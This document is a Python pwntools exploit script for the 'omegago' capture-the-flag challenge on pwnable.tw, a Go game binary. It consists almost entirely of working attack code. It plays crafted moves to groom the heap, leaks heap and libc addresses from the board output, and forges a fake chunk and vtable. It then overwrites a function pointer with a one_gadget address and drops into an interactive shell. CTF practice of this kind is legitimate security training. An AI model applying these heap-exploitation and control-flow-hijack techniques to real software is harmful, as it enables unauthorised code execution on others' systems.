from pwn import *

sla = lambda delim, data: p.sendlineafter(delim, data)
sa = lambda delim, data: p.sendafter(delim, data)
sl = lambda data: p.sendline(data)


def surrender():
     sla(b'Time', b'surrender')
     sla(b'(y/n)', b'n')
     sla(b'(y/n)', b'y')
def regret():
     sla(b'Time', b'regret')
def set_X(alpha, num):
    sla(b'Time remain', alpha.encode() + str(num).encode())
def set_O(alpha, num):
    sla(b'Time remain', chr(ord('S') - ord(alpha) + ord('A')).encode() + str(19 - num + 1).encode())
def convert_to_num():
     num = 0
     i = 0
     while( i < 32):
          chr = p.recv(1)
          match chr:
               case b'X':
                    num |= 2 << (2*i)
                    #print('X: ', hex(num), 'i: ', i)
                    i += 1
               case b'O':
                    num |= 1 << (2*i)
                    #print('Y: ', hex(num), 'i: ', i)
                    i += 1
               case b'\x00':
                    num |= 3 << (2*i)
                    #print('\\x00: ', hex(num), 'i: ', i)
                    i += 1
               case b'.':
                    #print('.: ', hex(num), 'i: ', i)
                    i += 1 
               case _:
                    continue
     return num  
def index_to_coord(i, j):
     for x in range(19):
          for y in range(19):
               if (2*(19*x + y) == ((i << 6) | (2*j))):
                    return x, y
     print('Can\'t find coordinates for', i, 'and', j)
     exit(-1)
def set_value(i, j, value):
     x, y = index_to_coord(i, j)
     if value == 0x1:
          set_O(chr(0x41 + y), 19 - x)
     else:
          set_X(chr(0x41 + y), 19 - x)

elf = context.binary = ELF('omegago')
libc = ELF('libc.so.6')


#nc chall.pwnable.tw 10405

p = remote('chall.pwnable.tw', 10405)
#p = process()
#gdb.attach(p, gdbscript='''
#c
#           b *0x0000000004017FC
#           ''')

#make heap align for further exploit
surrender()

#fill the history array, not play at some location for further used
print('Fill history')
for i in range(19):
    set_X(chr(i + 0x41), 18)
for i in range(17, 11, -1):
    for j in range(1, 18, 1):
        set_O(chr(j + 0x41), i)
for i in range(17, 11, -1):
        set_X('A', i)
        set_X('S', i)
for i in range(0x41, 0x41 + 19, 1):
     set_X(chr(i), 11)
for i in range(0x42, 0x42 + 17, 1):
     set_X(chr(i), 17)
for i in range(0x42, 0x42 + 13, 1):
     set_X(chr(i), 16)


#now the board having heap address to leak
print('Leak heap')
p.recvuntil(b'19')
leak = convert_to_num()
print('leak: ', hex(leak))
heap = leak - 0x23e00
print('heap: ', hex(heap))


print('Add 0x80 to first chunk in board')
x, y = index_to_coord(0, 3) # add 0x80 to first chunk in game_state global variable
print('x: ', x, ' y: ', y)
print(chr(0x41 + y))
print(19 - x)
set_X(chr(0x41 + y), 19 - x)

print('regret to leak libc')
regret() # leak libc

p.recvuntil(b'19')
for i in range(8):
    convert_to_num()

leak = convert_to_num()
print('leak: ', hex(leak))    
libc.address = leak - 0x3c3b78
print('libc: ', hex(libc.address))


print('surrender for alignment')
#this is for heap alignment
for i in range(0x6):
     surrender()

#create fake chunk on board
print('Creating fake chunk on board')
set_value(7, 0, 1)
set_value(7, 2, 2)

set_value(11, 0, 1)
set_value(11, 2, 2)


#fill the history array
print('Fill the history')
for i in range(0x41, 0x41 + 19, 1):
     for j in range(17, 15, -1):
          set_X(chr(i), j)
for i in range(0x41, 0x41 + 19, 1):
     set_O(chr(i), 18)
for i in range(0x41, 0x41 + 19, 1):
     set_O(chr(i), 15)

for i in range(0x41, 0x41 + 19, 1):
     set_X(chr(i), 17)
for i in range(0x42, 0x41 + 19, 1):
     set_X(chr(i), 16)
set_O('A', 16)

for i in range(0x42, 0x41 + 19, 1):
     set_X(chr(i), 17)
for i in range(0x42, 0x41 + 19, 1):
     set_X(chr(i), 16)
set_O('A', 17)

for i in range(0x42, 0x41 + 19, 1):
     set_X(chr(i), 17)
for i in range(0x43, 0x43 + 9, 1):
     set_X(chr(i), 16)


print('overwrite some bits of first chunk on board to point to mid of second chunk')
set_value(0, 4, 1)


#input("Free fake chunk")
surrender()


print('fill history')
for i in range(0x41, 0x41 + 19, 1):
     for j in range(19, 11, -1):
          set_X(chr(i), j)
for i in range(0x41, 0x41 + 19, 1):
     set_O(chr(i), 11)

#fake vtable
print('craft vtable to choice global variable')
set_value(8, 3, 1)
set_value(8, 5, 1)
set_value(8, 6, 1)
set_value(8, 7, 2)
set_value(8, 10, 2)
set_value(8, 11, 1)

#just play 4 time, anywhere as long as not break the vtable
set_value(1, 0, 1)
set_value(1, 1, 1)
set_value(1, 2, 1)
set_value(1, 3, 1)

print('reuse the chunk having vtable')
ONE_GADGET = 0xf0567 + libc.address

print('one_gadget: ', hex(ONE_GADGET))
print("Overwrite fake chunk")



sla(b'Time', b'A19A' + p64(ONE_GADGET)[:-2])
#for i in range(0x41, 0x41 + 19, 1):
#     for j in range(14, 12, -1):
#          set_X(chr(i), j)
#for i in range(0x41, 0x41 + 19, 1):
#     set_O(chr(i), 15)
#for i in range(0x41, 0x41 + 19, 1):
#     set_O(chr(i), 12)

#for i in range(0x41, 0x41 + 7, 1):
#     set_X(chr(i), 18)


#set_value(0, 2, 2) # change offset of first chunk in board


p.interactive()
#fill the history array
#for i in range(0x42, 0x42 + 17, 1):
#     set_X(chr(i), 17)
#for i in range(0x42, 0x42 + 13, 1):
#     set_X(chr(i), 16)


#set_X('B', 16)



#x, y = index_to_coord(2, 3)
#print('x: ', x, ' y: ', y)
#print(chr(0x41 + y))
#print(19 - x)
#set_X(chr(0x41 + y), 19 - x)

#x, y = index_to_coord(4, 4)
#print('x: ', x, ' y: ', y)
#print(chr(0x41 + y))
#print(19 - x)
#set_X(chr(0x41 + y), 19 - x)


#x, y = index_to_coord(6, 3)
#print('x: ', x, ' y: ', y)
#print(chr(0x41 + y))
#print(19 - x)
#set_X(chr(0x41 + y), 19 - x)

#set_O('B', 19)
#set_X('A', 18)

#sla(b'Time', b'regret')


#p.recvuntil(b'19')
#for i in range(0x8):
#     convert_to_num()
#leak = convert_to_num()
#print('leak: ', hex(leak))
#libc.address = leak - 0x3c3b78
#print('libc: ', hex(libc.address))
